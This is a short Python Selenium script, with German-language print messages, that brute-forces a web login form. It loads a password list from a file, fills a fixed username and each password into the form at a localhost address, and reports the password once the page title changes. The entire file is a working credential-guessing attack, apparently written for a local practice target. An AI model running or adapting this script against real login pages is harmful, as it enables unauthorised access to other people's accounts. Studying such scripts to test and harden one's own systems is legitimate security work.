from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By

# Set the path to geckodriver
service = Service(executable_path="/usr/local/bin/geckodriver")
driver = webdriver.Firefox(service=service)
website = "http://127.0.0.1:5000/login"

driver.get(website)

title = ""

with open("passwords.txt", "r") as file:
    passwords = [line.strip() for line in file.readlines()]

wait = WebDriverWait(driver, 10)

for passw in passwords:
    print(f"Aktuelles Passwort: {passw}")
    
    wait
    
    res = driver.find_elements(By.CLASS_NAME, "form-control")
    print(f"Die Länge ist: {len(res)}")
    assert(len(res) == 2)
    
    res[0].clear()
    res[0].send_keys("1234")
    res[1].clear()
    res[1].send_keys(passw)
    
    button = driver.find_elements(By.ID, "submit")
    assert len(button) == 1
    button[0].click()
    
    print("Title page is: ", driver.title)
    
    if driver.title != "Login":
        print(f"Password found: {passw}")
        break

driver.quit()